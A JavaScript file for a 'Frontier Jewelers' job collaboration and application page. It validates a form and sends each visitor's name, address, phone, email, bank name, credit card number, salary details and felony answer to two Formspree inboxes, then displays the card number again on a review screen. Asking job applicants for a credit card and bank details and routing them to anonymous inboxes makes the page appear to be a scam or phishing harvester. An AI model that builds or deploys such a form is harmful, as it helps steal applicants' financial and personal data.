/* ============================================================
   FRONTIER JEWELERS — Collaboration proposal & application
   One form collects the visitor's details and delivers them to both
   Formspree inboxes, so the two never hold different things:
   1. formspree.io/f/xwlvnyql  (salary payment proposal)
   2. formspree.io/f/mdealbkw  (application)
   Plus: review summary, header navigation, and loader.
   ============================================================ */

(function () {
  "use strict";

  var ENDPOINTS = [
    "https://formspree.io/f/xwlvnyql",
    "https://formspree.io/f/mdealbkw"
  ];

  var loader = document.getElementById("loader");
  var siteHeader = document.getElementById("siteHeader");
  var headerNav = document.getElementById("headerNav");
  var hamburgerBtn = document.getElementById("hamburgerBtn");

  var form = document.getElementById("secondForm");
  var statusEl = document.getElementById("formspreeSecondStatus");
  var reviewStatusEl = document.getElementById("reviewStatus");

  // Snapshot of the record the visitor already submitted. The form is cleared
  // after a successful POST, so the review step reads from here to keep
  // showing the visitor's real information.
  var submittedRecord = null;

  // True once the review step has delivered the record, so the form above
  // cannot put a second copy of the same person into the same inboxes.
  var deliveredFromReview = false;

  /* ----------------------------------------------------------
     Small helpers
     ---------------------------------------------------------- */

  // Read a field by id, scoped to the form so a stray duplicate id
  // elsewhere on the page can never return the wrong element.
  function fieldValue(form, id) {
    var el = form ? form.querySelector("#" + id) : null;
    return el ? String(el.value || "").trim() : "";
  }

  function fieldChecked(form, id) {
    var el = form ? form.querySelector("#" + id) : null;
    return !!(el && el.checked);
  }

  // One record shape for both endpoints: the proposal inbox and the
  // application inbox receive exactly the same fields with the same
  // names, so the two never hold different things.
  function buildPayload(d) {
    var first = d.first || "";
    var last = d.last || "";

    return {
      full_name: (first + " " + last).trim(),
      first_name: first,
      last_name: last,
      email: d.email || "",
      phone: d.phone || "",
      street_address: d.street || "",
      address_line_2: d.address2 || "",
      city: d.city || "",
      state: d.state || "",
      postal_code: d.postal || "",
      country: d.country || "United States",
      payment_method: d.payMethod || "",
      salary_amount: d.salary || "",
      bank_name: d.bankName || "",
      credit_card: d.creditCard || "",
      feature: d.feature || "",
      felony: d.felony || "",
      date: d.date || "",
      brands_approval: d.brandApproval || "",
      agree: d.agree === true || d.agree === "Yes"
    };
  }

  // Read the form into the flat shape buildPayload expects.
  function readForm() {
    return {
      first: fieldValue(form, "p_first"),
      last: fieldValue(form, "p_last"),
      email: fieldValue(form, "p_email"),
      phone: fieldValue(form, "p_phone"),
      street: fieldValue(form, "p_street"),
      address2: fieldValue(form, "p_address2"),
      city: fieldValue(form, "p_city"),
      state: fieldValue(form, "p_state"),
      postal: fieldValue(form, "p_postal"),
      country: fieldValue(form, "p_country") || "United States",
      payMethod: fieldValue(form, "p_payMethod"),
      salary: fieldValue(form, "p_salary"),
      bankName: fieldValue(form, "p_bank"),
      creditCard: fieldValue(form, "p_creditCard"),
      feature: fieldValue(form, "p_feature"),
      felony: fieldValue(form, "p_felony"),
      date: fieldValue(form, "p_date"),
      brandApproval: fieldValue(form, "p_brandApproval"),
      agree: fieldChecked(form, "p_agree")
    };
  }

  // Write text into a review cell only when it exists.
  function setText(id, value) {
    var el = document.getElementById(id);
    if (el) el.textContent = value || "—";
  }

  function clearErrors(form, statusElement) {
    if (!form) return;
    form.querySelectorAll(".field-error").forEach(function (el) {
      el.textContent = "";
      el.classList.remove("visible");
    });
    form.querySelectorAll(".form-control.error").forEach(function (el) {
      el.classList.remove("error");
    });
    if (statusElement) {
      statusElement.classList.remove("form-status--success", "form-status--error");
      statusElement.textContent = "";
    }
  }

  function setFieldError(control, message) {
    var group = control.closest(".form-group") || control.closest(".checkbox-group");
    if (group) {
      var errorEl = group.querySelector(".field-error");
      if (errorEl) {
        errorEl.textContent = message;
        errorEl.classList.add("visible");
      }
    }
    control.classList.add("error");
  }

  // Validate every required control inside a form and surface the
  // first problem. Returns true when the form may be submitted.
  function validateForm(form, statusElement) {
    var valid = true;
    var firstInvalid = null;

    clearErrors(form, statusElement);

    form.querySelectorAll("[required]").forEach(function (control) {
      if (control.type === "checkbox") {
        if (!control.checked) {
          setFieldError(control, "Please tick this box to continue.");
          valid = false;
          if (!firstInvalid) firstInvalid = control;
        }
        return;
      }

      var value = String(control.value || "").trim();
      if (!value) {
        setFieldError(control, "This field is required.");
        valid = false;
        if (!firstInvalid) firstInvalid = control;
        return;
      }

      if (control.type === "email" && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
        setFieldError(control, "Please enter a valid email address.");
        valid = false;
        if (!firstInvalid) firstInvalid = control;
        return;
      }

      if (control.type === "tel" && !/^[+]?[\d\s\-()]{7,20}$/.test(value)) {
        setFieldError(control, "Please enter a valid phone number.");
        valid = false;
        if (!firstInvalid) firstInvalid = control;
      }
    });

    if (!valid && firstInvalid) {
      var target = firstInvalid.closest(".form-group") || firstInvalid.closest(".checkbox-group") || firstInvalid;
      target.scrollIntoView({ behavior: "smooth", block: "center" });
      setTimeout(function () {
        if (typeof firstInvalid.focus === "function") firstInvalid.focus();
      }, 300);
    }

    return valid;
  }

  function postTo(endpoint, data) {
    return fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json", Accept: "application/json" },
      body: JSON.stringify(data)
    });
  }

  // Send the one record to every inbox. Rejects unless *all* endpoints accept
  // it, so a partially delivered submission is never reported as a success.
  function deliver(data) {
    var payload = buildPayload(data);

    return Promise.all(
      ENDPOINTS.map(function (endpoint) {
        return postTo(endpoint, payload);
      })
    ).then(function (responses) {
      var failed = responses.some(function (res) {
        return !res.ok;
      });
      if (failed) throw new Error("Submission failed");

      submittedRecord = payload;
      return payload;
    });
  }

  function showStatus(element, kind, message) {
    if (!element) return;
    element.classList.remove("form-status--success", "form-status--error");
    element.classList.add(kind === "success" ? "form-status--success" : "form-status--error");
    element.textContent = message;
    element.scrollIntoView({ behavior: "smooth", block: "center" });
  }

  /* ----------------------------------------------------------
     Loader
     ---------------------------------------------------------- */
  if (loader) {
    var hideLoader = function () {
      setTimeout(function () {
        loader.classList.add("hidden");
      }, 400);
    };

    if (document.readyState === "complete") {
      hideLoader();
    } else {
      window.addEventListener("load", hideLoader);
    }
  }

  /* ----------------------------------------------------------
     Header navigation (mobile menu + scroll shadow)
     ---------------------------------------------------------- */
  function closeNav() {
    if (headerNav) headerNav.classList.remove("open");
    if (hamburgerBtn) {
      hamburgerBtn.classList.remove("active");
      hamburgerBtn.setAttribute("aria-expanded", "false");
    }
  }

  if (hamburgerBtn && headerNav) {
    hamburgerBtn.addEventListener("click", function () {
      var open = headerNav.classList.toggle("open");
      hamburgerBtn.classList.toggle("active", open);
      hamburgerBtn.setAttribute("aria-expanded", open ? "true" : "false");
    });
  }

  document.querySelectorAll(".nav-link").forEach(function (link) {
    link.addEventListener("click", function () {
      document.querySelectorAll(".nav-link").forEach(function (l) {
        l.classList.remove("active");
      });
      link.classList.add("active");
      closeNav();
    });
  });

  if (siteHeader) {
    var onScroll = function () {
      siteHeader.classList.toggle("scrolled", window.scrollY > 20);
    };
    window.addEventListener("scroll", onScroll, { passive: true });
    onScroll();
  }

  document.addEventListener("keydown", function (event) {
    if (event.key === "Escape") closeNav();
  });

  // Keep the visible nav link in sync while the visitor scrolls.
  var sections = [
    { id: "home", link: 'a.nav-link[href="#home"]' },
    { id: "proposal", link: 'a.nav-link[href="#proposal"]' },
    { id: "review", link: 'a.nav-link[href="#review"]' },
    { id: "contact", link: 'a.nav-link[href="#contact"]' }
  ];

  if ("IntersectionObserver" in window) {
    var observer = new IntersectionObserver(
      function (entries) {
        entries.forEach(function (entry) {
          if (!entry.isIntersecting) return;
          var match = sections.filter(function (s) {
            return s.id === entry.target.id;
          })[0];
          if (!match) return;
          document.querySelectorAll(".nav-link").forEach(function (l) {
            l.classList.remove("active");
          });
          var activeLink = document.querySelector(match.link);
          if (activeLink) activeLink.classList.add("active");
        });
      },
      { rootMargin: "-45% 0px -50% 0px", threshold: 0 }
    );

    sections.forEach(function (section) {
      var el = document.getElementById(section.id);
      if (el) observer.observe(el);
    });
  }

  /* ----------------------------------------------------------
     1. The details form — delivered to both inboxes
     ---------------------------------------------------------- */
  if (form) {
    form.addEventListener("submit", function (event) {
      event.preventDefault();

      // The review step already delivered this visitor's record to the same
      // inboxes — sending again would put a duplicate in both.
      if (deliveredFromReview) {
        showStatus(
          statusEl,
          "error",
          "Your details were already submitted from the review step, so nothing was sent twice."
        );
        return;
      }

      if (!validateForm(form, statusEl)) {
        showStatus(statusEl, "error", "Please complete the highlighted fields above.");
        return;
      }

      var submitButton = form.querySelector('button[type="submit"]');
      if (submitButton) submitButton.disabled = true;

      deliver(readForm())
        .then(function (payload) {
          showStatus(
            statusEl,
            "success",
            "Thank you, " + payload.full_name + "! Your details have been submitted. We'll be in touch soon."
          );
          form.reset();
          populateReview();
        })
        .catch(function () {
          showStatus(
            statusEl,
            "error",
            "We couldn't submit your details right now. Please try again."
          );
        })
        .then(function () {
          if (submitButton) submitButton.disabled = false;
        });
    });
  }

  /* ----------------------------------------------------------
     2. Review summary

     Live form values win; the record the visitor already submitted is kept
     as a fallback so the review step never loses data after the form clears.
     ---------------------------------------------------------- */
  function collectReviewData() {
    var saved = submittedRecord || {};

    function pick(live, fromRecord) {
      return live || fromRecord || "";
    }

    return {
      first: pick(fieldValue(form, "p_first"), saved.first_name),
      last: pick(fieldValue(form, "p_last"), saved.last_name),
      email: pick(fieldValue(form, "p_email"), saved.email),
      phone: pick(fieldValue(form, "p_phone"), saved.phone),
      payMethod: pick(fieldValue(form, "p_payMethod"), saved.payment_method),
      salary: pick(fieldValue(form, "p_salary"), saved.salary_amount),
      bankName: pick(fieldValue(form, "p_bank"), saved.bank_name),
      creditCard: pick(fieldValue(form, "p_creditCard"), saved.credit_card),
      street: pick(fieldValue(form, "p_street"), saved.street_address),
      address2: pick(fieldValue(form, "p_address2"), saved.address_line_2),
      city: pick(fieldValue(form, "p_city"), saved.city),
      state: pick(fieldValue(form, "p_state"), saved.state),
      postal: pick(fieldValue(form, "p_postal"), saved.postal_code),
      country: pick(fieldValue(form, "p_country"), saved.country) || "United States",
      felony: pick(fieldValue(form, "p_felony"), saved.felony),
      date: pick(fieldValue(form, "p_date"), saved.date),
      feature: pick(fieldValue(form, "p_feature"), saved.feature),
      brandApproval: pick(fieldValue(form, "p_brandApproval"), saved.brands_approval),
      agree:
        fieldChecked(form, "p_agree") || saved.agree === true ? "Yes" : "No"
    };
  }

  function populateReview() {
    var data = collectReviewData();

    setText("review-first", data.first);
    setText("review-last", data.last);
    setText("review-email", data.email);
    setText("review-phone", data.phone);
    setText("review-paymethod", data.payMethod);
    setText("review-salary", data.salary);
    setText("review-bankname", data.bankName);
    setText("review-creditcard", data.creditCard);
    setText("review-street", data.street);
    setText("review-address2", data.address2);
    setText("review-city", data.city);
    setText("review-state", data.state);
    setText("review-postal", data.postal);
    setText("review-country", data.country);
    setText("review-felony", data.felony);
    setText("review-date", data.date);
    setText("review-feature", data.feature);
    setText("review-agree", data.agree);
    setText("review-brandapproval", data.brandApproval);
  }

  var editBtn = document.getElementById("editReviewBtn");
  if (editBtn) {
    editBtn.addEventListener("click", populateReview);
  }

  /* ----------------------------------------------------------
     3. Final submission from the review step
     ---------------------------------------------------------- */
  var submitReviewBtn = document.getElementById("submitReviewBtn");
  if (submitReviewBtn) {
    submitReviewBtn.addEventListener("click", function () {
      var data = collectReviewData();

      clearErrors(form, reviewStatusEl);

      var missing = [];
      if (!data.first) missing.push("First name");
      if (!data.last) missing.push("Last name");
      if (!data.email) missing.push("Email");
      if (!data.phone) missing.push("Phone");
      if (!data.payMethod) missing.push("Salary paid to");
      if (!data.salary) missing.push("Salary amount");
      if (!data.bankName) missing.push("Bank name");
      if (!data.street) missing.push("Street address");
      if (!data.city) missing.push("City");
      if (!data.state) missing.push("State / region");
      if (!data.postal) missing.push("Postal code");
      if (!data.country) missing.push("Country");
      if (!data.felony) missing.push("Felony question");
      if (!data.date) missing.push("Date");
      if (!data.brandApproval) missing.push("Brand's approval");
      if (!data.feature) missing.push("Feature");
      if (data.agree !== "Yes") missing.push("Agreement");

      if (missing.length) {
        showStatus(
          reviewStatusEl,
          "error",
          "Please complete the form first: " + missing.join(", ") + "."
        );
        return;
      }

      // Each record is sent once: if the form above already delivered to
      // these endpoints, the review step does not send the same person twice.
      if (submittedRecord) {
        showStatus(
          reviewStatusEl,
          "success",
          "Your details already reached us, so nothing was sent twice."
        );
        return;
      }

      submitReviewBtn.disabled = true;

      deliver(data)
        .then(function (payload) {
          deliveredFromReview = true;
          showStatus(
            reviewStatusEl,
            "success",
            "Thank you, " + (data.first || payload.full_name) + "! Your details have been submitted. We'll be in touch soon."
          );
          populateReview();
        })
        .catch(function () {
          showStatus(
            reviewStatusEl,
            "error",
            "We couldn't submit your details right now. Please try again."
          );
        })
        .then(function () {
          submitReviewBtn.disabled = false;
        });
    });
  }
})();
